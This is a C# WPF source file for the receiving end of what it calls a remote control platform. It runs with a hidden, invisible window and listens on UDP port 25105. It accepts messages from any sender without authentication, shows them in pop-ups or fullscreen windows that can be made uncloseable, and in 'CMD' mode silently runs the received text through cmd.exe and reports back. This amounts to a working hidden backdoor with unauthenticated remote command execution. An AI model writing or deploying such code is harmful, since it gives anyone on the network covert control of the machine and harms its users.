using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows;
using System.Collections.Generic;
using System.Reflection;

namespace 远程控制平台接收端
{
    public partial class App : Application
    {
        private static Mutex mutex;
        private UdpClient udpClient;
        private Thread listeningThread;
        private bool isListening = true;
        private static Dictionary<Window, string> windowSenders = new Dictionary<Window, string>();

        // ================== 应用程序主循环 ==================
        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);
            
            bool createdNew;
            string mutexName = @"Global\StackNi_RemoteControl_Receiver";
            
            mutex = new Mutex(true, mutexName, out createdNew);
            
            if (!createdNew)
            {
                Environment.Exit(0);
                return;
            }
            
            this.ShutdownMode = ShutdownMode.OnExplicitShutdown;
            CreateHiddenMainWindow();
            StartListening();
        }

        protected override void OnExit(ExitEventArgs e)
        {
            base.OnExit(e);
            
            isListening = false;
            
            if (udpClient != null)
            {
                udpClient.Close();
                udpClient = null;
            }
            
            if (listeningThread != null && listeningThread.IsAlive)
            {
                try
                {
                    listeningThread.Join(1000);
                    if (listeningThread.IsAlive)
                        listeningThread.Abort();
                }
                finally
                {
                    listeningThread = null;
                }
            }
            
            if (mutex != null)
            {
                mutex.ReleaseMutex();
                mutex.Dispose();
                mutex = null;
            }
        }

        // ================== 创建隐藏窗口 ==================
        private void CreateHiddenMainWindow()
        {
            try
            {
                var hiddenWindow = new Window();
                hiddenWindow.Width = 0;
                hiddenWindow.Height = 0;
                hiddenWindow.WindowStyle = WindowStyle.None;
                hiddenWindow.ShowInTaskbar = false;
                hiddenWindow.AllowsTransparency = true;
                hiddenWindow.Opacity = 0;
                
                this.MainWindow = hiddenWindow;
                hiddenWindow.Show();
                hiddenWindow.Hide();
            }
            catch (Exception ex)
            {
                MessageBox.Show("创建隐藏窗口失败: " + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(1);
            }
        }

        // ================== UDP监听 ==================
        private void StartListening()
        {
            try
            {
                udpClient = new UdpClient(25105);
                
                listeningThread = new Thread(new ThreadStart(ListenForMessages));
                listeningThread.IsBackground = true;
                listeningThread.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show("启动监听失败: " + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(1);
            }
        }

        private void ListenForMessages()
        {
            IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 0);
            
            while (isListening)
            {
                try
                {
                    byte[] data = udpClient.Receive(ref remoteEP);
                    string receivedData = Encoding.UTF8.GetString(data);
                    
                    string[] messageParts = receivedData.Split('|');
                    
                    if (messageParts.Length >= 4)
                    {
                        string username = messageParts[0];
                        string message = messageParts[1];
                        string durationStr = messageParts[2];
                        string displayMode = messageParts[3];
                        
                        int displayDuration;
                        if (!int.TryParse(durationStr, out displayDuration) || displayDuration == -1)
                            displayDuration = 0;
                        
                        int remotePort = remoteEP.Port;
                        
                        Dispatcher.Invoke(new Action(() =>
                        {
                            ShowMessageInNewWindow(displayMode, username, remoteEP.Address.ToString(), message, displayDuration, remotePort);
                        }));
                    }
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (SocketException ex)
                {
                    if (!isListening || ex.SocketErrorCode == SocketError.Interrupted)
                        break;
                    
                    if (isListening)
                    {
                        Dispatcher.Invoke(new Action(() =>
                        {
                            MessageBox.Show("接收消息错误: " + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                        }));
                    }
                }
                catch (Exception ex)
                {
                    if (isListening)
                    {
                        Dispatcher.Invoke(new Action(() =>
                        {
                            MessageBox.Show("接收消息错误: " + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                        }));
                    }
                }
            }
        }

        // ================== 消息处理 ==================
        private void ShowMessageInNewWindow(string mode, string username, string ip, string message, int duration, int remotePort)
        {
            bool allowClose = true;
            if (mode.EndsWith("_NOCLOSE"))
            {
                allowClose = false;
                mode = mode.Replace("_NOCLOSE", "");
            }
            
            if (mode == "CMD")
            {
                ExecuteCmdCommand(username, ip, message, remotePort);
                return;
            }
            
            if (mode == "CLOSE")
            {
                CloseWindowsFromSender(ip, username, remotePort);
                return;
            }
            
            Window messageWindow = null;
            
            if (mode == "MARQUEEN")
                messageWindow = new Window1();
            else if (mode == "NORMAL")
                messageWindow = new Window2();
            else if (mode == "TYPEWRITER")
                messageWindow = new Window3();
            else if (mode == "BLINK")
                messageWindow = new Window4();
            else if (mode == "FULLSCREEN")
                messageWindow = new Window5();
            
            if (messageWindow != null)
            {
                if (!allowClose)
                {
                    messageWindow.Loaded += (s, e) => 
                    {
                        var closeButton = messageWindow.FindName("CloseButton") as System.Windows.Controls.Image;
                        if (closeButton != null)
                            closeButton.Visibility = Visibility.Collapsed;
                    };
                }
                
                string senderKey = ip + ":" + remotePort;
                lock (windowSenders)
                {
                    windowSenders[messageWindow] = senderKey;
                }
                
                messageWindow.Closed += (s, e) => 
                {
                    lock (windowSenders)
                    {
                        if (windowSenders.ContainsKey(messageWindow))
                            windowSenders.Remove(messageWindow);
                    }
                };
                
                if (messageWindow is Window1)
                    ((Window1)messageWindow).DisplayMessage(username, ip, message, duration, remotePort);
                else if (messageWindow is Window2)
                    ((Window2)messageWindow).DisplayMessage(username, ip, message, duration, remotePort);
                else if (messageWindow is Window3)
                    ((Window3)messageWindow).DisplayMessage(username, ip, message, duration, remotePort);
                else if (messageWindow is Window4)
                    ((Window4)messageWindow).DisplayMessage(username, ip, message, duration, remotePort);
                else if (messageWindow is Window5)
                    ((Window5)messageWindow).DisplayMessage(username, ip, message, duration, remotePort);
                
                messageWindow.Show();
            }
        }

        // ================== cmd命令执行 ==================
        private void ExecuteCmdCommand(string username, string ip, string command, int remotePort)
        {
            ThreadPool.QueueUserWorkItem(state =>
            {
                try
                {
                    bool isGuiCommand = IsGuiCommand(command);
                    
                    using (System.Diagnostics.Process process = new System.Diagnostics.Process())
                    {
                        string systemCmdPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\SysNative\cmd.exe";
                        
                        if (!System.IO.File.Exists(systemCmdPath))
                            systemCmdPath = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\cmd.exe";
                        
                        process.StartInfo.FileName = systemCmdPath;
                        process.StartInfo.Arguments = "/c " + command;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.CreateNoWindow = true;

                        process.Start();
                        
                        if (isGuiCommand)
                        {
                            if (process.WaitForExit(2500))
                            {
                                string error = process.StandardError.ReadToEnd();
                                
                                if (process.ExitCode != 0 && !string.IsNullOrWhiteSpace(error))
                                {
                                    string fullError = "CMD命令执行失败\n退出代码: " + process.ExitCode + "\n错误信息: " + error;
                                    SendResponse(ip, fullError, remotePort, true);
                                    return;
                                }
                            }
                            
                            SendResponse(ip, "CMD_EXECUTED_OK", remotePort, false);
                        }
                        else
                        {
                            string output = process.StandardOutput.ReadToEnd();
                            string error = process.StandardError.ReadToEnd();
                            
                            process.WaitForExit();

                            if (process.ExitCode != 0 && !string.IsNullOrWhiteSpace(error))
                            {
                                string fullError = "CMD命令执行失败\n退出代码: " + process.ExitCode + "\n错误信息: " + error;
                                SendResponse(ip, fullError, remotePort, true);
                            }
                            else
                            {
                                SendResponse(ip, "CMD_EXECUTED_OK", remotePort, false);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    SendResponse(ip, "执行CMD命令时出错\n错误信息: " + ex.Message, remotePort, true);
                }
            });
        }

        // ================== 关闭消息窗口 ==================
        private void CloseWindowsFromSender(string senderIP, string username, int remotePort)
        {
            try
            {
                string senderKey = senderIP + ":" + remotePort;
                List<Window> windowsToClose = new List<Window>();
                
                lock (windowSenders)
                {
                    foreach (var kvp in windowSenders)
                    {
                        if (kvp.Value == senderKey)
                            windowsToClose.Add(kvp.Key);
                    }
                }
                
                foreach (Window window in windowsToClose)
                {
                    window.Dispatcher.Invoke(() =>
                    {
                        if (window is Window3 || window is Window4)
                            window.Close();
                        else
                            StartFadeOutAnimation(window);
                    });
                }
                
                SendResponse(senderIP, "WINDOWS_CLOSED_OK", remotePort, false);
            }
            catch (Exception ex)
            {
                SendResponse(senderIP, "关闭消息窗口时出错\n错误信息: " + ex.Message, remotePort, true);
            }
        }

        private void StartFadeOutAnimation(Window window)
        {
            try
            {
                var fadeOutAnimation = new System.Windows.Media.Animation.DoubleAnimation();
                fadeOutAnimation.From = window.Opacity;
                fadeOutAnimation.To = 0;
                fadeOutAnimation.Duration = TimeSpan.FromSeconds(0.8);
                
                fadeOutAnimation.Completed += (s, e) =>
                {
                    window.Dispatcher.Invoke(() =>
                    {
                        window.Close();
                    });
                };
                
                window.BeginAnimation(Window.OpacityProperty, fadeOutAnimation);
            }
            catch (Exception)
            {
                window.Close();
            }
        }

        // ================== 统一发送方法（用同一个udpClient）==================
        public void SendResponse(string senderIP, string message, int remotePort, bool isError)
        {
            IPEndPoint target = new IPEndPoint(IPAddress.Parse(senderIP), remotePort);
                
            // 如果是错误消息，加上 "ERROR:" 前缀
            string responseData = isError ? "ERROR:" + message : message;
                
            byte[] data = Encoding.UTF8.GetBytes(responseData);
            udpClient.Send(data, data.Length, target);
        }

        private bool IsGuiCommand(string command)
        {
            string lowerCommand = command.ToLower();
            return lowerCommand.Contains("regedit") ||
                   lowerCommand.Contains("msconfig") ||
                   lowerCommand.Contains("notepad") ||
                   lowerCommand.Contains("calc") ||
                   lowerCommand.Contains("mspaint") ||
                   lowerCommand.Contains("winver") ||
                   lowerCommand.Contains("control") ||
                   lowerCommand.Contains("taskmgr") ||
                   lowerCommand.Contains("devmgmt.msc") ||
                   lowerCommand.Contains("services.msc") ||
                   lowerCommand.Contains("eventvwr") ||
                   lowerCommand.Contains("compmgmt.msc") ||
                   lowerCommand.Contains("diskmgmt.msc") ||
                   lowerCommand.Contains("taskschd.msc") ||
                   lowerCommand.Contains("gpedit.msc") ||
                   lowerCommand.Contains("secpol.msc") ||
                   lowerCommand.Contains("perfmon") ||
                   lowerCommand.Contains("resmon") ||
                   lowerCommand.Contains("cleanmgr") ||
                   lowerCommand.Contains("dfrgui") ||
                   lowerCommand.Contains("charmap") ||
                   lowerCommand.Contains("snippingtool") ||
                   lowerCommand.Contains("magnify") ||
                   lowerCommand.Contains("osk") ||
                   lowerCommand.Contains("narrator") ||
                   lowerCommand.Contains("psr") ||
                   lowerCommand.Contains("stikynot") ||
                   lowerCommand.Contains("wordpad") ||
                   lowerCommand.Contains("write") ||
                   lowerCommand.Contains("mspaint") ||
                   lowerCommand.Contains("wmplayer") ||
                   lowerCommand.Contains("dvdplay") ||
                   lowerCommand.Contains("soundrecorder") ||
                   lowerCommand.Contains("recorder") ||
                   lowerCommand.Contains("mip") ||
                   lowerCommand.Contains("msinfo32") ||
                   lowerCommand.Contains("dxdiag") ||
                   lowerCommand.Contains("systempropertiesadvanced") ||
                   lowerCommand.Contains("systempropertiescomputername") ||
                   lowerCommand.Contains("systempropertieshardware") ||
                   lowerCommand.Contains("systempropertiesperformance") ||
                   lowerCommand.Contains("systempropertiesprotection") ||
                   lowerCommand.Contains("systeminforemation") ||
                   lowerCommand.Contains("firewall.cpl") ||
                   lowerCommand.Contains("timedate.cpl") ||
                   lowerCommand.Contains("desk.cpl") ||
                   lowerCommand.Contains("main.cpl") ||
                   lowerCommand.Contains("powercfg.cpl") ||
                   lowerCommand.Contains("telephon.cpl") ||
                   lowerCommand.Contains("intl.cpl") ||
                   lowerCommand.Contains("joy.cpl") ||
                   lowerCommand.Contains("netsetup.cpl") ||
                   lowerCommand.Contains("access.cpl") ||
                   lowerCommand.Contains("hdwwiz.cpl") ||
                   lowerCommand.Contains("appwiz.cpl") ||
                   lowerCommand.Contains("bthprops.cpl") ||
                   lowerCommand.Contains("irprops.cpl") ||
                   lowerCommand.Contains("ncpa.cpl") ||
                   lowerCommand.Contains("tabletpc.cpl") ||
                   lowerCommand.Contains("wscui.cpl") ||
                   lowerCommand.Contains("wuaucpl.cpl") ||
                   lowerCommand.Contains("certmgr.msc") ||
                   lowerCommand.Contains("ciadv.msc") ||
                   lowerCommand.Contains("comexp.msc") ||
                   lowerCommand.Contains("dfrg.msc") ||
                   lowerCommand.Contains("dsa.msc") ||
                   lowerCommand.Contains("dssite.msc") ||
                   lowerCommand.Contains("fsmgmt.msc") ||
                   lowerCommand.Contains("lusrmgr.msc") ||
                   lowerCommand.Contains("printmanagement.msc") ||
                   lowerCommand.Contains("rsop.msc") ||
                   lowerCommand.Contains("sdclt") ||
                   lowerCommand.Contains("sysdm.cpl") ||
                   lowerCommand.Contains("verifier") ||
                   lowerCommand.Contains("wmimgmt.msc") ||
                   lowerCommand.Contains("iexplore") ||
                   lowerCommand.Contains("chrome") ||
                   lowerCommand.Contains("firefox") ||
                   lowerCommand.Contains("winword") ||
                   lowerCommand.Contains("excel") ||
                   lowerCommand.Contains("powerpnt") ||
                   lowerCommand.Contains("outlook") ||
                   lowerCommand.Contains("acrord32") ||
                   lowerCommand.Contains("photoshop") ||
                   lowerCommand.Contains("mspub") ||
                   lowerCommand.Contains("cmd") ||
                   lowerCommand.Contains("visio");
        }
    }

    // ================== 去除所有消息窗口的WS_SYSMENU ==================
    internal static class NativeMethods
    {
        public const int GWL_STYLE = -16;
        public const int WS_SYSMENU = 0x00080000;
        
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    }
}